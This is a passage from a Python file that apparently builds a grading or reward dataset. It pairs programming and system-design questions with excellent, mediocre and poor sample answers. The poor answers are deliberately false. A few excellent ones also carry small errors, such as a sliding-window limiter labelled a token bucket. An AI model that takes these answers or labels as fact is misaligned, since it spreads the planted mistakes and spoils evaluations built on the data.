    "Is the event loop explained correctly with microtasks and macrotasks?",
    excellent=[
        "JS is single-threaded. The event loop allows async operations:\n\nCall stack: where JS executes code (LIFO)\nWeb APIs: browser handles setTimeout, fetch, DOM events\nMicrotask queue: Promises, queueMicrotask (higher priority)\nMacrotask queue (callback queue): setTimeout, setInterval\n\nLoop: 1) Run call stack until empty 2) Drain microtask queue 3) One macrotask 4) Repeat",
        "console.log('1');\nsetTimeout(() => console.log('3'), 0);\nPromise.resolve().then(() => console.log('2'));\nconsole.log('4');\n\n// Output: 1, 4, 2, 3\n// 1,4: synchronous\n// 2: microtask (Promise) runs before next macrotask\n// 3: macrotask (setTimeout) runs last",
        "Microtasks (processed between tasks):\n- Promise.then/catch/finally\n- async/await (resumption after await)\n- queueMicrotask()\n- MutationObserver\n\nMacrotasks (one per loop iteration):\n- setTimeout / setInterval\n- setImmediate (Node.js)\n- I/O events\n- requestAnimationFrame",
        "Why this matters:\nasync function getUser() {\n  const user = await fetch('/api/user');  // suspends here\n  // resumed as microtask when fetch resolves\n  return user.json();\n}\n\nStarving the event loop:\nfor (let i = 0; i < 1e9; i++) {}  // blocks everything!\n// Use setTimeout/requestIdleCallback to yield",
    ],
    mediocre=[
        "The event loop processes callbacks from the queue when the call stack is empty.",
        "JavaScript is single-threaded. The event loop handles async operations by queuing callbacks.",
        "Promises are processed before setTimeout callbacks because they use the microtask queue.",
    ],
    poor=[
        "The event loop runs JavaScript on multiple threads simultaneously.",
        "setTimeout(fn, 0) runs the function immediately.",
        "The event loop is only relevant for Node.js, not browsers.",
    ],
)

add(
    "Explain JavaScript's 'this' keyword and how context works",
    "Is 'this' binding explained correctly with common pitfalls?",
    excellent=[
        "'this' refers to the object that invoked the function.\n\nGlobal: this === window (browser) or {} (strict mode)\nMethod: this === the object\n\nconst obj = {\n  name: 'Alice',\n  greet() { return `Hello, ${this.name}`; }\n};\nobj.greet();  // 'Hello, Alice'\n\nconst fn = obj.greet;\nfn();  // 'Hello, undefined' — lost context!",
        "Arrow functions: 'this' inherited from enclosing scope (lexical this).\n\nclass Timer {\n  constructor() { this.count = 0; }\n  start() {\n    // Arrow: this = Timer instance\n    setInterval(() => this.count++, 1000);\n\n    // Regular function: this = undefined or window\n    setInterval(function() { this.count++; }, 1000);  // bug!\n  }\n}",
        "Explicit binding:\nfn.call(obj, arg1, arg2)    — call with context\nfn.apply(obj, [arg1, arg2]) — call with context, args as array\nfn.bind(obj)                — returns new function with fixed context\n\nconst greet = obj.greet.bind(obj);\ngreet();  // 'Hello, Alice' — context preserved",
        "Priority order:\n1. new binding: new Foo() — this = new object\n2. Explicit: call/apply/bind\n3. Implicit: method call obj.fn()\n4. Default: global or undefined (strict mode)\n\nArrow functions cannot have their 'this' changed via bind/call/apply.",
    ],
    mediocre=[
        "'this' refers to the object that called the function. Arrow functions inherit 'this' from parent scope.",
        "Use bind() to fix 'this' context when passing methods as callbacks.",
        "In a class, 'this' refers to the instance. In regular functions, it depends on how the function is called.",
    ],
    poor=[
        "'this' always refers to the window object.",
        "Arrow functions have their own 'this' which is always the function itself.",
        "'this' is the same as 'self' in Python.",
    ],
)

add(
    "Write a JavaScript function to deep clone an object",
    "Is the deep clone implementation correct and complete?",
    excellent=[
        "// Simplest for JSON-serializable data:\nfunction deepClone(obj) {\n  return JSON.parse(JSON.stringify(obj));\n}\n// Limitation: loses undefined, functions, Date, RegExp, circular refs\n\n// Modern: structuredClone (built-in, handles more types)\nconst clone = structuredClone(obj);  // ES2022+",
        "// Full recursive implementation:\nfunction deepClone(obj, seen = new WeakMap()) {\n  if (obj === null || typeof obj !== 'object') return obj;\n  if (seen.has(obj)) return seen.get(obj);  // handle circular refs\n  if (obj instanceof Date) return new Date(obj);\n  if (obj instanceof RegExp) return new RegExp(obj);\n  const clone = Array.isArray(obj) ? [] : {};\n  seen.set(obj, clone);\n  for (const key of Reflect.ownKeys(obj)) {\n    clone[key] = deepClone(obj[key], seen);\n  }\n  return clone;\n}",
        "// Practical comparison:\nconst orig = { a: 1, nested: { b: 2 } };\n\n// Shallow clone - nested is shared reference!\nconst shallow = { ...orig };\nshallow.nested.b = 99;\nconsole.log(orig.nested.b);  // 99 ← mutated original!\n\n// Deep clone - independent copies\nconst deep = structuredClone(orig);\ndeep.nested.b = 99;\nconsole.log(orig.nested.b);  // 2 ← original unchanged",
        "// lodash _.cloneDeep (widely used):\nimport _ from 'lodash';\nconst clone = _.cloneDeep(obj);\n\n// Handles: Maps, Sets, circular refs, Dates, Buffers\n// structuredClone (native) handles most cases without a library",
    ],
    mediocre=[
        "JSON.parse(JSON.stringify(obj)) deep clones most objects but doesn't work for functions or undefined.",
        "const clone = {...original} only shallow clones. Use JSON or structuredClone for deep clone.",
        "function deepClone(obj) { return JSON.parse(JSON.stringify(obj)); }",
    ],
    poor=[
        "const clone = obj; creates a deep copy.",
        "Use Object.assign({}, obj) to deep clone an object.",
        "Deep cloning is automatic in JavaScript when you assign objects.",
    ],
)

# ── More System Design ────────────────────────────────────────────────────────
add(
    "How would you design a URL shortener like bit.ly?",
    "Is the URL shortener design complete and sensible?",
    excellent=[
        "Requirements:\n- Shorten URL: POST /shorten → short URL\n- Redirect: GET /:code → 301/302 redirect\n- Analytics: click count, geography\n\nCore encoding:\n# 7-char base62 ID = 62^7 = 3.5 trillion unique URLs\nimport random, string\nCHARS = string.ascii_letters + string.digits  # base62\ndef generate_code(length=7):\n    return ''.join(random.choices(CHARS, k=length))\n\nDB schema:\nURLs: (id, code UNIQUE, original_url, created_at, expiry)\nClicks: (id, code, timestamp, ip, country)",
        "Architecture:\nClient → Load Balancer → App Servers → Cache → DB\n\nRead path (redirect):\n1. GET /:code\n2. Check Redis cache (code → url, ~1ms)\n3. Cache miss: query DB\n4. 301 (permanent, browser caches) or 302 (track every click)\n\nWrite path (shorten):\n1. POST /shorten with long URL\n2. Check if URL already shortened (dedup)\n3. Generate unique code\n4. Store in DB + cache\n5. Return short URL",
        "Scalability:\nRead-heavy (100:1 read:write). Optimize for reads.\n\nCache: Redis with LRU eviction. Cache top 20% of URLs handles 80% of traffic.\nDB: PostgreSQL for metadata. Read replicas for scale.\nScale writes: code generation in distributed ID service (avoid race conditions).\n\nCollision handling:\nCheck uniqueness before insert, retry with new code if collision.",
        "Custom aliases: allow users to set custom slug.\nExpiration: TTL on Redis + DB soft delete.\nAnalytics async: write clicks to Kafka → consumer aggregates → analytics DB.\nRate limiting: prevent abuse, max N shortens per IP/account.",
    ],
    mediocre=[
        "Store a mapping of short codes to long URLs in a database. Use a random string as the short code.",
        "Hash the URL to create a short code, check for collisions, store in DB. Redirect by looking up the code.",
        "Use base62 encoding to generate short codes. Cache popular URLs in Redis for fast redirects.",
    ],
    poor=[
        "Just use the MD5 hash of the URL as the short code.",
        "Store all URLs in memory for fast access.",
        "A URL shortener only needs a simple database with two columns.",
    ],
)

add(
    "Design a rate limiting system for an API",
    "Is the rate limiting design practical and complete?",
    excellent=[
        "Algorithms:\n1. Fixed window: count requests per minute window.\n   Simple but burst at window boundary.\n\n2. Sliding window log: store timestamps of each request.\n   Accurate but memory-intensive for high traffic.\n\n3. Token bucket: tokens added at fixed rate, consumed per request.\n   Allows bursts up to bucket capacity.\n\n4. Leaky bucket: requests processed at fixed rate.\n   Smooth output, queue for bursts.",
        "Redis token bucket implementation:\nimport time\n\ndef is_allowed(user_id, limit=100, window=60):\n    key = f'rate:{user_id}'\n    now = time.time()\n    pipe = redis.pipeline()\n    pipe.zadd(key, {now: now})           # add current request\n    pipe.zremrangebyscore(key, 0, now - window)  # remove old\n    pipe.zcard(key)                       # count in window\n    pipe.expire(key, window)\n    _, _, count, _ = pipe.execute()\n    return count <= limit\n\n# 429 Too Many Requests if not allowed",
        "HTTP response headers:\nX-RateLimit-Limit: 100\nX-RateLimit-Remaining: 42\nX-RateLimit-Reset: 1699999999  # Unix timestamp\nRetry-After: 30  # seconds until reset (for 429 responses)\n\nTiers:\n- Anonymous: 60 req/hour\n- Free tier: 1000 req/hour\n- Pro: 10000 req/hour\n- Key in: IP, user ID, or API key",
        "Distributed rate limiting:\nSingle Redis (works to millions QPS with Redis Cluster).\nLocal cache + async sync to Redis reduces latency.\n\nEdge rate limiting:\nCloudflare Workers, AWS WAF rate rules.\nRate limit at CDN level before traffic hits origin.\n\nFail open vs fail closed:\nRedis down: allow requests (fail open) to avoid outage, or block (fail closed) for security.",
    ],
    mediocre=[
        "Track requests per user in Redis with a counter and TTL. Return 429 when limit is exceeded.",
        "Use a token bucket algorithm. Add tokens over time, subtract on each request. Reject if empty.",
        "Store request timestamps per user. Count requests in the last minute. Block if over the limit.",
    ],
    poor=[
        "Just add a counter to each request and reset it every hour.",
        "Rate limiting requires hardware load balancers.",
        "Use a database transaction to count and limit requests atomically.",
    ],
)

# ── CSS / Frontend ────────────────────────────────────────────────────────────
add(
    "Explain CSS flexbox and when to use it vs CSS grid",
    "Is flexbox vs grid explained correctly?",
    excellent=[
        "Flexbox: one-dimensional layout (row OR column).\nGrid: two-dimensional layout (rows AND columns).\n\nFlexbox use cases:\n- Navigation bars\n- Centering content\n- Distributing items in a row or column\n\n.container {\n  display: flex;\n  justify-content: space-between;  /* main axis */\n  align-items: center;             /* cross axis */\n  gap: 16px;\n}",
        "CSS Grid use cases:\n- Page layouts\n- Card grids\n- Complex two-dimensional arrangements\n\n.grid {\n  display: grid;\n  grid-template-columns: repeat(3, 1fr);\n  grid-template-rows: auto;\n  gap: 24px;\n}\n\n/* Responsive grid without media queries: */\ngrid-template-columns: repeat(auto-fit, minmax(250px, 1fr));",
        "Flexbox key properties:\nflex-direction: row | column\njustify-content: flex-start | center | space-between | space-around\nalign-items: stretch | center | flex-start | flex-end\nflex-wrap: wrap | nowrap\nflex: grow shrink basis (shorthand)\n\nflex: 1 = flex-grow: 1 = fill available space equally",
        "Combined usage (common pattern):\n/* Grid for overall layout */\n.page {\n  display: grid;\n  grid-template-areas:\n    'header header'\n    'sidebar main'\n    'footer footer';\n}\n/* Flexbox inside components */\n.header {\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n}",
    ],
    mediocre=[
        "Flexbox is for one-dimensional layouts. Grid is for two-dimensional. Use flexbox for rows/columns, grid for page layouts.",
        "Flexbox distributes space along one axis. Grid defines both rows and columns.",
        "Use flexbox for aligning items in a row. Use grid for complex layout structures.",
    ],
    poor=[
        "Flexbox is old and should be replaced with grid in all cases.",
        "CSS grid and flexbox are the same thing.",
        "Flexbox only works in Chrome. Use float for cross-browser compatibility.",
    ],
)

add(
    "What is CSS specificity and how is it calculated?",
    "Is CSS specificity explained correctly?",
    excellent=[
        "Specificity determines which CSS rule wins when multiple rules target the same element.\n\nSpecificity is calculated as (a, b, c, d):\na: inline styles (1,0,0,0)\nb: ID selectors (0,1,0,0)\nc: class, attribute, pseudo-class (0,0,1,0)\nd: element, pseudo-element (0,0,0,1)\n\nExamples:\n* { }                  → (0,0,0,0)\np { }                  → (0,0,0,1)\n.nav { }               → (0,0,1,0)\n#main { }              → (0,1,0,0)\nstyle='color:red'      → (1,0,0,0)",
        "Comparing specificity:\np.intro { color: blue; }      → (0,0,1,1)\n.intro { color: red; }        → (0,0,1,0)\n\np.intro wins → blue\n\n!important overrides all specificity:\n.btn { color: red !important; }  /* wins against inline styles */\nAvoid !important — leads to specificity wars.",
        "Compound selectors:\n#nav .item:hover a { }  → (0,1,1,0,1) → (0,1,2,1)\nBreak it down:\n#nav → (0,1,0,0)\n.item → (0,0,1,0)\n:hover → (0,0,1,0)\na → (0,0,0,1)\nTotal: (0,1,2,1)",
        "BEM methodology avoids specificity issues:\n.block__element--modifier { }  /* all single class selectors */\n/* Every rule has equal specificity (0,0,1,0) */\n/* No need for !important */\n\nCSS-in-JS and CSS Modules scope styles to component → specificity wars avoided.",
    ],
    mediocre=[
        "Specificity determines which CSS rule takes priority. IDs are most specific, then classes, then elements.",
        "More specific selectors override less specific ones. !important overrides everything.",
        "ID selectors (1-0-0) beat class selectors (0-1-0) which beat element selectors (0-0-1).",
    ],
    poor=[
        "The last CSS rule always wins regardless of specificity.",
        "!important should be used on all your most important styles.",
        "Inline styles have lower specificity than IDs.",
    ],
)

# ── More DevOps / Infrastructure ──────────────────────────────────────────────
add(
    "What is infrastructure as code and why is it important?",
    "Is IaC explained correctly with key benefits?",
    excellent=[
        "Infrastructure as Code (IaC): manage and provision infrastructure through code, not manual processes.\n\nBenefits:\n- Version controlled: track changes like application code\n- Repeatable: same code produces same infrastructure\n- Automated: no manual clicks → fewer human errors\n- Self-documenting: infrastructure described in code\n- Disaster recovery: rebuild from code in minutes\n\nTools: Terraform, AWS CloudFormation, Pulumi, Ansible.",
        "Terraform example:\nresource \"aws_instance\" \"web\" {\n  ami           = \"ami-0c55b159cbfafe1f0\"\n  instance_type = \"t3.micro\"\n  tags = {\n    Name = \"web-server\"\n    Env  = var.environment\n  }\n}\n\n$ terraform plan   # preview changes\n$ terraform apply  # apply changes\n$ terraform destroy  # tear down\n\nState file tracks current infrastructure state.",
        "IaC vs ClickOps:\nClickOps: click around AWS console → undocumented, not reproducible, drift.\nIaC: code + git → changes audited, peer-reviewed, automated.\n\nConfiguration drift: manual changes cause infrastructure to diverge from desired state.\nIaC enforces desired state on every apply.",
        "GitOps: IaC in git, CI/CD auto-applies to environments.\nPR for infrastructure change → code review → merge → auto-apply.\n\nTesting IaC:\nterraform validate — syntax\ntflint — linting\nterraform plan — preview (diff)\ncheckov — security scanning\nterratest — integration test deployed infrastructure.",
    ],
    mediocre=[
        "IaC means writing code to provision and manage infrastructure instead of configuring it manually.",
        "Tools like Terraform let you define your infrastructure in files and apply it reproducibly.",
        "IaC makes infrastructure reproducible, version controlled, and automated.",
    ],
    poor=[
        "IaC means writing Python scripts that call cloud APIs.",
        "IaC is only useful for companies with hundreds of servers.",
        "IaC and configuration management are the same thing.",
    ],
)

add(
    "Explain blue-green deployment and canary deployment",
    "Are the deployment strategies explained correctly?",
    excellent=[
        "Blue-Green Deployment:\nTwo identical production environments: Blue (current) and Green (new version).\n\n1. Deploy new version to Green\n2. Run smoke tests on Green\n3. Switch load balancer to route traffic to Green\n4. Blue becomes idle (instant rollback: switch back)\n\nPros: zero downtime, instant rollback\nCons: requires double the infrastructure",
        "Canary Deployment:\nGradually route traffic to new version.\n\n1. Deploy v2 alongside v1\n2. Route 5% of traffic to v2\n3. Monitor error rates, latency, business metrics\n4. Slowly increase: 5% → 25% → 50% → 100%\n5. Rollback at any point if metrics degrade\n\nPros: reduced blast radius, real traffic validation\nCons: longer rollout, complex traffic splitting\n\nFeature flags: similar pattern but at application layer.",
        "Implementation options:\nBlue-Green:\n- AWS: switch ALB target group\n- Kubernetes: update Service selector (blue-pod → green-pod)\n\nCanary:\n- nginx: upstream weighted\n- Istio: VirtualService traffic weight\n- AWS CodeDeploy: canary traffic shifting\n- Kubernetes: multiple Deployments + weighted Service",
        "Comparison:\n             Blue-Green    Canary\nRisk         Low            Very Low\nRollback     Instant        Fast\nInfra cost   2x            Partial\nTraffic split 0%/100%      Gradual\nBest for     Small changes  High-risk releases\n\nRolling update (basic strategy): replace pods gradually, no traffic control.",
    ],
    mediocre=[
        "Blue-green deploys to a second environment and switches traffic instantly. Canary gradually shifts traffic to the new version.",
        "Blue-green allows instant rollback by switching back. Canary limits exposure by routing small percentage first.",
        "Both reduce downtime compared to in-place deployments.",
    ],
    poor=[
        "Blue-green means deploying at 2am when traffic is low.",
        "Canary deployment is named after the bird and means slow deployment.",
        "Both blue-green and canary require manual server configuration.",
    ],
)

# ── More Python ───────────────────────────────────────────────────────────────
add(
    "Explain Python's dataclasses and when to use them",
    "Are dataclasses explained correctly with practical comparison to plain classes?",
    excellent=[
        "dataclasses auto-generate __init__, __repr__, __eq__ based on field annotations.\n\nfrom dataclasses import dataclass, field\n\n@dataclass\nclass User:\n    id: int\n    name: str\n    email: str\n    roles: list = field(default_factory=list)\n\n# vs writing manually:\nclass User:\n    def __init__(self, id, name, email, roles=None):\n        self.id = id; self.name = name; self.email = email\n        self.roles = roles or []\n    def __repr__(self): ...\n    def __eq__(self, other): ...",
        "Dataclass options:\n@dataclass(frozen=True)  # immutable, hashable\n@dataclass(order=True)   # generates __lt__, __gt__, etc.\n@dataclass(slots=True)   # uses __slots__ (Python 3.10+, faster)\n\nField options:\nfield(default=0)                    # simple default\nfield(default_factory=list)         # mutable default (avoids shared mutable)\nfield(repr=False)                   # exclude from __repr__\nfield(compare=False)                # exclude from __eq__",
        "Inheritance:\n@dataclass\nclass Animal:\n    name: str\n    species: str\n\n@dataclass\nclass Dog(Animal):\n    breed: str\n    species: str = 'Canis lupus'\n\n# Post-init processing:\n@dataclass\nclass Circle:\n    radius: float\n    area: float = field(init=False)\n    def __post_init__(self):\n        self.area = 3.14159 * self.radius ** 2",
        "Dataclass vs NamedTuple vs Pydantic:\n\nNamedTuple: immutable, tuple semantics\nDataclass: mutable by default, class-like\nPydantic BaseModel: validation, serialization, ideal for APIs\n\n# Pydantic:\nfrom pydantic import BaseModel\nclass User(BaseModel):\n    id: int\n    email: str  # validated as email format\n\nFor FastAPI request/response models: use Pydantic.\nFor internal data structures: use dataclass.",
    ],
    mediocre=[
        "Dataclasses are a decorator that auto-generates boilerplate like __init__ and __repr__ from type annotations.",
        "Use @dataclass instead of writing __init__ manually. Saves code and reduces errors.",
        "from dataclasses import dataclass\n@dataclass\nclass Point:\n    x: float\n    y: float",
    ],
    poor=[
        "Dataclasses are for storing data in databases.",
        "Dataclasses are slower than regular classes.",
        "You should use dictionaries instead of dataclasses for simplicity.",
    ],
)

add(
    "What are Python type hints and why should you use them?",
    "Are type hints explained correctly with practical benefits?",
    excellent=[
        "Type hints annotate variables and function signatures with expected types.\n\ndef greet(name: str, times: int = 1) -> str:\n    return (f'Hello, {name}! ' * times).strip()\n\nfrom typing import Optional, List, Dict, Tuple, Union\n\ndef process(data: List[dict]) -> Optional[str]:\n    ...\n\nPython doesn't enforce them at runtime — they're documentation + static analysis.",
        "Benefits:\n- IDE autocomplete and IntelliSense\n- Catch type errors before runtime (mypy, pyright)\n- Self-documenting code\n- Easier refactoring\n\nmypy example:\ndef add(a: int, b: int) -> int:\n    return a + b\nadd('hello', 'world')  # mypy error: str instead of int",
        "Modern type hints (Python 3.10+):\n# Union with | operator\ndef parse(value: str | int) -> str:\n    return str(value)\n\n# Optional is just | None\ndef find(id: int) -> User | None: ...\n\n# TypedDict for dict structures\nfrom typing import TypedDict\nclass UserDict(TypedDict):\n    id: int\n    name: str",
        "Generic types:\nfrom typing import TypeVar, Generic\n\nT = TypeVar('T')\n\nclass Stack(Generic[T]):\n    def __init__(self) -> None:\n        self._items: list[T] = []\n    def push(self, item: T) -> None:\n        self._items.append(item)\n    def pop(self) -> T:\n        return self._items.pop()\n\ns: Stack[int] = Stack()\ns.push(42)  # mypy checks T=int",
    ],
    mediocre=[
        "Type hints add type information to Python functions and variables. Tools like mypy can check them.",
        "Type hints make code more readable and help catch bugs with static analysis tools.",
        "def greet(name: str) -> str: — the str annotations are type hints.",
    ],
    poor=[
        "Type hints make Python slow because of type checking at runtime.",
        "Python is dynamically typed so type hints are never useful.",
        "Type hints are required for Python code to run correctly.",
    ],
)

# ── More SQL Advanced ─────────────────────────────────────────────────────────
add(
    "What is a database view and when should you use one?",
    "Is the view concept explained correctly?",
    excellent=[
        "A view is a named query stored in the database. Querying a view executes the underlying query.\n\nCREATE VIEW active_users AS\nSELECT id, name, email, created_at\nFROM users\nWHERE active = true AND deleted_at IS NULL;\n\nUsage:\nSELECT * FROM active_users WHERE created_at > '2024-01-01';\n-- equivalent to querying users with all conditions",
        "Benefits:\n- Abstraction: hide complex joins from application code\n- Security: expose only certain columns/rows\n- Reusability: share complex query logic\n- Simplify migrations: view adapts to schema changes\n\nMaterialized Views (PostgreSQL):\nStores results on disk — faster reads, stale data.\nREFRESH MATERIALIZED VIEW CONCURRENTLY mv_report;\nGood for: expensive aggregations, dashboards.",
        "Updatable views:\nSimple views on single table can be inserted/updated through.\nComplex views (with joins, aggregates) are read-only.\n\nUse WITH CHECK OPTION to prevent inserts that wouldn't appear in view:\nCREATE VIEW active_users AS\nSELECT * FROM users WHERE active = true\nWITH CHECK OPTION;  -- INSERT must satisfy WHERE condition",
        "Common use cases:\n- Report views: complex aggregations for analytics\n- API views: expose clean interface, hide internal tables\n- Security: grant SELECT on view, not underlying tables\n- Compatibility: rename columns transparently\n\nLimitation: views add indirection — complex view chains can be hard to debug and optimize.",
    ],
    mediocre=[
        "A view is a virtual table based on a SQL query. It simplifies complex queries.",
        "Use views to hide complexity and give access to a subset of data.",
        "CREATE VIEW myview AS SELECT ... — then query it like a table.",
    ],
    poor=[
        "Views are the same as tables but faster.",
        "Always use views instead of tables for better security.",
        "Views permanently store query results in the database.",
    ],
)

# ── More Git ──────────────────────────────────────────────────────────────────
add(
    "What is the difference between git fetch and git pull?",
    "Is the fetch vs pull distinction explained correctly?",
    excellent=[
        "git fetch: downloads remote changes but does NOT update your working branch.\nSafe — lets you inspect before integrating.\n\ngit fetch origin         # fetch all branches from origin\ngit fetch origin main    # fetch only main\ngit log origin/main      # inspect what changed\ngit diff HEAD origin/main  # see what's different",
        "git pull: git fetch + git merge (or rebase with --rebase).\nAutomatically merges remote changes into current branch.\n\ngit pull origin main         # fetch + merge\ngit pull --rebase origin main  # fetch + rebase (cleaner history)\n\nPrefer git fetch + inspect + merge/rebase for important branches.\nUse git pull for routine day-to-day updates on feature branches.",
        "git pull with fast-forward only:\ngit pull --ff-only\n# Fails if local has diverged from remote — prevents unexpected merges\n# Good safety setting: git config pull.ff only",
        "Tracking branches:\nAfter git clone, your local main tracks origin/main.\ngit status shows: 'Your branch is behind origin/main by 2 commits'\n\ngit remote -v           # list remotes\ngit branch -vv          # show tracking info\ngit remote update       # fetch all remotes (like fetch for all)",
    ],
    mediocre=[
        "git fetch downloads changes without merging. git pull downloads and merges.",
        "Fetch is safer because it lets you review changes before integrating them.",
        "git pull = git fetch + git merge. Use fetch when you want to inspect first.",
    ],
    poor=[
        "git fetch is for cloning repositories for the first time.",
        "git pull is safer than git fetch.",
        "Both commands are identical except git pull is faster.",
    ],
)

add(
    "How do you write a good commit message?",
    "Is the commit message guidance practical and correct?",
    excellent=[
        "Conventional format (50/72 rule):\n- Subject: max 50 chars, imperative mood, no period\n- Blank line\n- Body: wrap at 72 chars, explain WHY not WHAT\n\nExample:\nfix: prevent race condition in user session creation\n\nUser sessions were being created concurrently when multiple tabs\nlogged in simultaneously, causing duplicate session records.\n\nAdded a unique constraint on (user_id, device_id) and handle\nthe IntegrityError with a SELECT to return the existing session.\n\nFixes #1234",
        "Conventional Commits format:\n<type>(<scope>): <description>\n\nTypes: feat, fix, docs, style, refactor, test, chore, perf\n\nfeat(auth): add OAuth2 Google login\nfix(api): handle null response from payment gateway\nrefactor(db): extract connection pool management to separate class\ndocs(readme): update development setup instructions\n\nEnables automated changelog generation with semantic-release.",
        "Good vs bad messages:\nBad:\n'fix bug'\n'update'\n'WIP'\n'changes to auth'\n\nGood:\n'fix: handle expired tokens in refresh flow'\n'feat: add batch export to CSV for analytics dashboard'\n'refactor: replace polling with WebSocket for live updates'\n\nRule: would someone reading this in 2 years understand WHY this changed?",
        "Git log setup for useful history:\ngit log --oneline --graph --all  # visual branch history\ngit show <commit>                # full commit details\ngit blame file.py                # who changed what line\ngit log -S 'function_name'       # commits that added/removed string\n\nAmend last commit message (before push):\ngit commit --amend -m 'corrected message'",
    ],
    mediocre=[
        "Write a clear subject line under 50 characters. Add a body explaining why the change was made.",
        "Use present tense: 'add feature' not 'added feature'. Be specific about what changed.",
        "Good commit messages explain the why, not just the what. Keep subjects short.",
    ],
    poor=[
        "Commit messages are not important as long as the code works.",
        "Always start commit messages with 'Updated' or 'Changed'.",
        "One-word commit messages like 'fix' are clear and concise.",
    ],
)

# ── More API Design ───────────────────────────────────────────────────────────
add(
    "How do you version a REST API and what are the tradeoffs?",
    "Are API versioning strategies explained correctly?",
    excellent=[
        "Versioning strategies:\n\n1. URL path (most common):\n   /api/v1/users, /api/v2/users\n   + Explicit, cacheable, browser-friendly\n   - Verbose URLs\n\n2. Query parameter:\n   /api/users?version=2\n   + Simple\n   - Easily ignored, not RESTful\n\n3. HTTP header:\n   Accept: application/vnd.myapi.v2+json\n   + Clean URLs\n   - Harder to test in browser",
        "When to version:\n- Breaking changes: rename/remove fields, change types\n- Non-breaking (don't version): add optional fields, new endpoints\n\nEvolutionary API (prefer no versioning):\n- Add fields (never remove)\n- Keep old fields as deprecated\n- Use feature detection, not version checks\n\nSuperset compatibility: v2 clients work against v1 API for additive changes.",
        "Versioning lifecycle:\n1. Release v2\n2. Deprecate v1 (add Deprecation header)\n3. Sunset date: Sunset: Sat, 01 Jan 2025 00:00:00 GMT\n4. Monitor usage (who's still on v1?)\n5. Remove after sunset\n\nDeprecation header:\nDeprecation: version=v1\nSunset: 2025-01-01T00:00:00Z",
        "Internal vs external APIs:\nPublic APIs: version aggressively, support multiple versions for years\nInternal APIs: versioning can be avoided with coordinated deploys\n\nHypermedia (HATEOAS): include links to next actions in response — clients discover API dynamically, less coupling to version.",
    ],
    mediocre=[
        "Use URL versioning like /v1/users and /v2/users. Keep old versions running until clients migrate.",
        "Add the version to the URL or a header. Never remove fields, only add them to avoid breaking clients.",
        "Version when making breaking changes. Support both versions during the transition period.",
    ],
    poor=[
        "Always use version 1 and never change the API.",
        "Just change the API and update all clients at the same time.",
        "API versioning is only needed for public APIs, never internal ones.",
    ],
)

# ── More Data Structures ──────────────────────────────────────────────────────
add(
    "Implement a LRU (Least Recently Used) cache in Python",
    "Is the LRU cache implemented correctly?",
    excellent=[
        "from collections import OrderedDict\n\nclass LRUCache:\n    def __init__(self, capacity: int):\n        self.cache = OrderedDict()\n        self.capacity = capacity\n\n    def get(self, key: int) -> int:\n        if key not in self.cache:\n            return -1\n        self.cache.move_to_end(key)  # mark as recently used\n        return self.cache[key]\n\n    def put(self, key: int, value: int) -> None:\n        if key in self.cache:\n            self.cache.move_to_end(key)\n        self.cache[key] = value\n        if len(self.cache) > self.capacity:\n            self.cache.popitem(last=False)  # evict LRU",
        "# Python has functools.lru_cache built in:\nfrom functools import lru_cache\n\n@lru_cache(maxsize=128)\ndef expensive_function(n):\n    return n * n  # cached result\n\n# For methods (avoid memory leaks):\nfrom functools import cached_property\nclass MyClass:\n    @cached_property\n    def computed(self):\n        return expensive_computation()",
        "# From scratch with doubly linked list + dict (O(1) all ops):\nclass Node:\n    def __init__(self, key=0, val=0):\n        self.key, self.val = key, val\n        self.prev = self.next = None\n\nclass LRUCache:\n    def __init__(self, cap):\n        self.cap = cap\n        self.cache = {}\n        self.head, self.tail = Node(), Node()  # sentinels\n        self.head.next = self.tail\n        self.tail.prev = self.head\n\n    def _remove(self, node):\n        node.prev.next = node.next\n        node.next.prev = node.prev\n\n    def _insert(self, node):  # insert before tail (most recent)\n        node.prev = self.tail.prev\n        node.next = self.tail\n        self.tail.prev.next = node\n        self.tail.prev = node",
        "# Time complexity: O(1) for both get and put\n# Space: O(capacity)\n\n# Usage:\ncache = LRUCache(2)\ncache.put(1, 1)\ncache.put(2, 2)\ncache.get(1)    # returns 1, moves 1 to front\ncache.put(3, 3) # evicts 2 (LRU), inserts 3\ncache.get(2)    # returns -1 (evicted)",
    ],
    mediocre=[
        "from collections import OrderedDict\nclass LRUCache:\n    def __init__(self, cap):\n        self.cap = cap\n        self.cache = OrderedDict()\n    def get(self, key):\n        if key not in self.cache: return -1\n        self.cache.move_to_end(key)\n        return self.cache[key]",
        "Use an OrderedDict. Move items to the end when accessed. Remove from the front when capacity exceeded.",
        "LRU cache evicts the least recently used item. Keep a dict for O(1) lookup and track access order.",
    ],
    poor=[
        "class LRUCache:\n    def __init__(self, cap):\n        self.cache = {}\n        self.cap = cap\n    def get(self, key): return self.cache.get(key, -1)\n    def put(self, key, val): self.cache[key] = val  # no eviction",
        "Use a list to implement LRU. Search for the key in the list on each get.",
        "LRU cache is just a dictionary with a maximum size.",
    ],
)

add(
    "What is a heap data structure and how does Python's heapq work?",
    "Is the heap and heapq explained correctly?",
    excellent=[
        "A heap is a complete binary tree satisfying the heap property:\nMin-heap: parent ≤ children (root is minimum)\nMax-heap: parent ≥ children (root is maximum)\n\nOperations:\npush: O(log n) — add and bubble up\npop: O(log n) — remove root, bubble down\npeek: O(1) — view min/max without removing\nbuild from list: O(n)",
        "Python heapq (min-heap):\nimport heapq\n\nheap = []\nheapq.heappush(heap, 5)\nheapq.heappush(heap, 1)\nheapq.heappush(heap, 3)\n\nheapq.heappop(heap)   # 1 — smallest\nheapq.heappop(heap)   # 3\n\n# Build heap in O(n):\ndata = [5, 1, 3, 2, 4]\nheapq.heapify(data)  # in-place",
        "Max-heap trick (negate values):\nmax_heap = []\nheapq.heappush(max_heap, -5)\nheapq.heappush(max_heap, -1)\nmax_val = -heapq.heappop(max_heap)  # 5\n\n# K largest elements:\nk = 3\nkth_largest = heapq.nlargest(k, data)  # O(n log k)\n# For fixed K, more efficient than sorting O(n log n)",
        "Priority queue use case:\ntasks = []\nheapq.heappush(tasks, (1, 'low priority task'))\nheapq.heappush(tasks, (0, 'urgent task'))\nheapq.heappush(tasks, (0, 'another urgent task'))\n\npriority, task = heapq.heappop(tasks)\nprint(task)  # 'another urgent task' (0, then alphabetical)\n\n# For objects: heapq compares tuples lexicographically",
    ],
    mediocre=[
        "A heap is a tree where the parent is always smaller (min-heap) or larger (max-heap) than children.",
        "Python's heapq is a min-heap. heappush and heappop are O(log n). heapify converts a list in O(n).",
        "Heaps are used for priority queues. The smallest element is always at position 0.",
    ],
    poor=[
        "A heap is just a sorted list with special access rules.",
